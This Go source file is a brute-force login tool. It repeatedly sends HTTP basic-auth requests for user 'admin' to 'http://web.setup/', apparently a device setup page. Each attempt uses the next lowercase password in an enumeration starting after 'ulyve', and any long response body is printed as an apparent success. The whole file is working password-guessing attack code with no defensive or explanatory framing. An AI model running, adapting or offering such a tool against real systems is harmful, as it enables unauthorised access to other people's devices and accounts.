package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
)

func main() {
	req, err := http.NewRequest(http.MethodGet, "http://web.setup/", nil)
	if err != nil {
		fmt.Println(err)
	}
	str := "ulyve"
	client := &http.Client{}
	for {
		str = nextstr(str)
		fmt.Print("\r", str)
		req.SetBasicAuth("admin", str)
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println(err)
		}
		b, _ := ioutil.ReadAll(resp.Body)
		if len(b) >= 1500 {
			fmt.Println("Respons =", string(b))
		}
		resp.Body.Close()
	}
}

func nextstr(str string) string {
	if str == "" {
		return "a"
	}
	ru := []rune(str)
	for n, v := range ru {
		if v == 'z' {
			ru[n] = 'a'
			if n == len(ru)-1 {
				ru = append(ru, 'a')
			}
			continue
		}
		ru[n]++
		break
	}
	// if ru[len(ru)-1] == 'a'{
	// 	ru = ru
	// }

	return string(ru)
}
